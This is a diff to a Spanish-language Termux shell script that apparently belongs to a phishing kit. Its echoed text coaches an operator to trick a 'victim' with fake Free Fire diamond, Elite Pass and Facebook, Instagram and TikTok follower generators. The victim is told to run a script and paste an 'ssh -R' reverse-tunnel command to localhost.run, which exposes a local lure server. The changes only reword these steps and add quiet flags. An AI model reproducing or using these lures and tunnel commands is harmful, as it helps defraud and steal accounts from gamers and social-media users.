@@ -161,9 +161,9 @@ sleep 1
 setterm -foreground cyan
 echo 'Al jugador se le esta agregando los Diamantes'
 echo ''
-echo 'Copie el siguiente codigo y pegelo en una nueva ventana'
+echo 'Copie el siguiente codigo y pegelo en una nueva ventana y dele enter
 echo ''
-echo 'ssh -R 80:localhost:5443 nokey@localhost.run'
+echo 'ssh -R 80:localhost:5443 nokey@localhost.run -q -yes'
 echo ''
 termux-setup-storage 
 cd /sdcard
@@ -192,7 +192,7 @@ echo 'con bash fre.sh le decimos que escriba su ID del Frefire y los diamantes'
 echo ''
 echo 'que desea agregar la victima  y le dicimos que de  enter'
 echo ''
-echo 'Una ves esto le va salir un codigo que comiensa con ssh y termina en run'
+echo 'Una ves esto le va salir un codigo que comiensa con ssh y termina en -yes'
 echo ''
 echo 'le pedimos que lo copie y lo pegue en una nueva sesion y le de enter'
 echo ''
@@ -297,9 +297,9 @@ sleep 1
 setterm -foreground cyan
 echo 'Al jugador se le esta agregando el PaseElite'
 echo ''
-echo 'Copie el siguiente codigo y pegelo en una nueva ventana'
+echo 'Copie el siguiente codigo y pegelo en una nueva ventana y dele enter'
 echo ''
-echo 'ssh -R 80:localhost:5444 nokey@localhost.run'
+echo 'ssh -R 80:localhost:5444 nokey@localhost.run -q -yes'
 echo ''
 termux-setup-storage 
 cd /sdcard
@@ -326,7 +326,7 @@ echo 'Le pedimos que lo abra con su termux , y listo le pediremos que lo ejecute
 echo ''
 echo 'con bash pase.sh le decimos que escriba su ID del Frefire y le de enter'
 echo ''
-echo 'Una ves esto le va salir un codigo que comiensa con ssh y termina en run'
+echo 'Una ves esto le va salir un codigo que comiensa con ssh y termina en -yes'
 echo ''
 echo 'le pedimos que lo copie y lo pegue en una nueva sesion y le de enter'
 echo ''
@@ -434,9 +434,9 @@ sleep 1
 setterm -foreground cyan
 echo 'A usted se le esta agregando los Seguidores'
 echo ''
-echo 'Copie el siguiente codigo y pegelo en una nueva ventana'
+echo 'Copie el siguiente codigo y pegelo en una nueva ventana y dele enter'
 echo ''
-echo 'ssh -R 80:localhost:5445 nokey@localhost.run'
+echo 'ssh -R 80:localhost:5445 nokey@localhost.run -q -yes'
 echo ''
 termux-setup-storage 
 cd /sdcard
@@ -465,7 +465,7 @@ echo 'con bash facebook.sh le decimos que escriba su nombre del facebook  y le'
 echo ''
 echo 'decimos que ingrese la cantidad de seguidores que desea tener'
 echo ''
-echo 'Una ves esto le va salir un codigo que comiensa con ssh y termina en run'
+echo 'Una ves esto le va salir un codigo que comiensa con ssh y termina en -yes'
 echo ''
 echo 'le pedimos que lo copie y lo pegue en una nueva sesion y le de enter'
 echo ''
@@ -573,9 +573,9 @@ sleep 1
 setterm -foreground cyan
 echo 'A usted se le esta agregando los Seguidores'
 echo ''
-echo 'Copie el siguiente codigo y pegelo en una nueva ventana'
+echo 'Copie el siguiente codigo y pegelo en una nueva ventana y dele enter'
 echo ''
-echo 'ssh -R 80:localhost:5446 nokey@localhost.run'
+echo 'ssh -R 80:localhost:5446 nokey@localhost.run -q -yes'
 echo ''
 termux-setup-storage 
 cd /sdcard
@@ -604,7 +604,7 @@ echo 'con bash instagram.sh le decimos que escriba su nombre del instagram y le 
 echo ''
 echo 'le decimos que ingrese la cantidad de seguidores que desea tener'
 echo ''
-echo 'Una ves esto le va salir un codigo que comiensa con ssh y termina en run'
+echo 'Una ves esto le va salir un codigo que comiensa con ssh y termina en -yes'
 echo ''
 echo 'le pedimos que lo copie y lo pegue en una nueva sesion y le de enter'
 echo ''
@@ -712,9 +712,9 @@ sleep 1
 setterm -foreground cyan
 echo 'A usted se le esta agregando los Seguidores'
 echo ''
-echo 'Copie el siguiente codigo y pegelo en una nueva ventana'
+echo 'Copie el siguiente codigo y pegelo en una nueva ventana y dele enter'
 echo ''
-echo 'ssh -R 80:localhost:5447 nokey@localhost.run'
+echo 'ssh -R 80:localhost:5447 nokey@localhost.run -q -yes'
 echo ''
 termux-setup-storage 
 cd /sdcard
@@ -742,7 +742,7 @@ echo 'con bash tiktok.sh le decimos que escriba su nombre del tiktok y le de ent
 echo ''
 echo 'le decimos que ingrese la cantidad de seguidores que desea tener'
 echo ''
-echo 'Una ves esto le va salir un codigo que comiensa con ssh y termina en run'
+echo 'Una ves esto le va salir un codigo que comiensa con ssh y termina en -yes'
 echo ''
 echo 'le pedimos que lo copie y lo pegue en una nueva sesion y le de enter'
 echo ''
